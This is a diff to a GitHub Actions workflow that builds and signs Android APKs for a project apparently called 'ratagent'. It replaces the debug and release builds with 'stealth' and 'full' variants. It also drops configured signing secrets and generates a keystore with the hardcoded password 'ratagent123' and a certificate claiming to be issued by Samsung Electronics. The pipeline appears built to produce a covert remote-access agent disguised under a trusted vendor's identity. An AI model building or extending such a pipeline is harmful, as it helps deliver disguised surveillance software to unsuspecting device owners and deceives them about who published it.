@@ -25,46 +25,46 @@ jobs:
         yes | /usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null || true
         /usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0" > /dev/null
 
-    - name: Build APK (debug + release)
+    - name: Build APKs (stealth + full, release)
       env:
         ANDROID_HOME: /usr/local/lib/android/sdk
       run: |
         curl -sL https://services.gradle.org/distributions/gradle-8.5-bin.zip -o /tmp/gradle.zip
         unzip -q /tmp/gradle.zip -d /opt
-        /opt/gradle-8.5/bin/gradle assembleDebug assembleRelease --no-daemon -g /opt/gradle-8.5 || exit 1
+        /opt/gradle-8.5/bin/gradle assembleStealthRelease assembleFullRelease --no-daemon -g /opt/gradle-8.5 || exit 1
 
-    - name: Sign APK
-      env:
-        KEYSTORE_B64: ${{ secrets.APK_KEYSTORE_B64 }}
-        KEYSTORE_PASS: ${{ secrets.APK_KEYSTORE_PASS }}
-        KEY_ALIAS: ${{ secrets.APK_KEY_ALIAS }}
-        KEY_ALIAS_PASS: ${{ secrets.APK_KEY_ALIAS_PASS }}
+    - name: Sign APKs
       run: |
         BT=/usr/local/lib/android/sdk/build-tools/34.0.0
-        if [ -n "$KEYSTORE_B64" ]; then
-          echo "$KEYSTORE_B64" | base64 -d > /tmp/keystore.jks
-          ALIAS="$KEY_ALIAS"; KPASS="$KEYSTORE_PASS"; KPASS2="$KEY_ALIAS_PASS"
-        else
-          # no secrets configured — generate a fresh keystore so we get a signed APK anyway
-          ALIAS="ratagent"; KPASS="ratagent123"; KPASS2="ratagent123"
-          keytool -genkey -v -keystore /tmp/keystore.jks \
-            -keyalg RSA -keysize 2048 -validity 10950 \
-            -alias ratagent -storepass ratagent123 -keypass ratagent123 \
-            -dname "CN=System Utility, OU=Utility, O=Util, L=LA, S=CA, C=US"
-        fi
-        $BT/zipalign -f 4 app/build/outputs/apk/release/app-release-unsigned.apk /tmp/app-release-aligned.apk
+        ALIAS="ratagent"; KPASS="ratagent123"
+        keytool -genkey -v -keystore /tmp/keystore.jks \
+          -keyalg RSA -keysize 2048 -validity 10950 \
+          -alias ratagent -storepass ratagent123 -keypass ratagent123 \
+          -dname "CN=Samsung Electronics Co., Ltd., O=Samsung, L=Suwon, S=Gyeonggi, C=KR"
+        $BT/zipalign -f 4 \
+          app/build/outputs/apk/stealth/release/stealth-release-unsigned.apk \
+          /tmp/stealth-aligned.apk
         $BT/apksigner sign --ks /tmp/keystore.jks \
           --ks-key-alias "$ALIAS" \
-          --ks-pass pass:"$KPASS" \
-          --key-pass pass:"$KPASS2" \
-          --out /tmp/app-release-signed.apk /tmp/app-release-aligned.apk
-        $BT/apksigner verify /tmp/app-release-signed.apk && echo "apksigner verify OK"
-        cp /tmp/app-release-signed.apk /tmp/signed-release.apk
-        cp app/build/outputs/apk/debug/app-debug.apk /tmp/debug.apk
+          --ks-pass pass:"$KPASS" --key-pass pass:"$KPASS" \
+          --out /tmp/stealth-release-signed.apk /tmp/stealth-aligned.apk
+        $BT/apksigner verify /tmp/stealth-release-signed.apk && echo "stealth signed OK"
+
+        $BT/zipalign -f 4 \
+          app/build/outputs/apk/full/release/full-release-unsigned.apk \
+          /tmp/full-aligned.apk
+        $BT/apksigner sign --ks /tmp/keystore.jks \
+          --ks-key-alias "$ALIAS" \
+          --ks-pass pass:"$KPASS" --key-pass pass:"$KPASS" \
+          --out /tmp/full-release-signed.apk /tmp/full-aligned.apk
+        $BT/apksigner verify /tmp/full-release-signed.apk && echo "full signed OK"
+
+        cp /tmp/stealth-release-signed.apk /tmp/stealth.apk
+        cp /tmp/full-release-signed.apk   /tmp/full.apk
 
     - uses: actions/upload-artifact@v4
       with:
         name: agent-apk
         path: |
-          /tmp/signed-release.apk
-          /tmp/debug.apk
+          /tmp/stealth.apk
+          /tmp/full.apk
